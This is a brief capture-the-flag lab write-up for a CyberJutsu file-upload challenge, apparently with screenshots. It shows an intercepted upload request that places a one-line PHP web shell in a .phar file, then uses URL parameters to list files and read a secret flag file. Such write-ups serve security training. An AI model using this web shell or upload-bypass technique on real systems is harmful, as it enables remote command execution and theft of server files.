# Lab Writeup – File Upload 3

## Overview

Platform: CyberJutsu  
Difficulty: Easy

---

![Image](./screenshots/file-upload-3-01.png)

---

## 1. Upload File test.txt and Press submit

![Image](./screenshots/file-upload-3-02.png)

---

## 2. Capture packets in Burp Suite and send an HTTP POST request

```
------WebKitFormBoundaryM4yrXwLpMRYvuO5A
Content-Disposition: form-data; name="file"; filename="test.phar"
Content-Type: text/plain

<?php system($_GET[x]); ?>
------WebKitFormBoundaryM4yrXwLpMRYvuO5A--
```

![Image](./screenshots/file-upload-3-03.png)

---

## 3. Access file test.phar and add parameter for url

```
https://www.../test.phar?x=ls%20-la%20
```

![Image](./screenshots/file-upload-3-04.png)

---

## 4. Find and Read secret.txt to get FLAG

```
https://www.../test.phar?x=cat%20/1ad7e7cd851-secret.txt
```
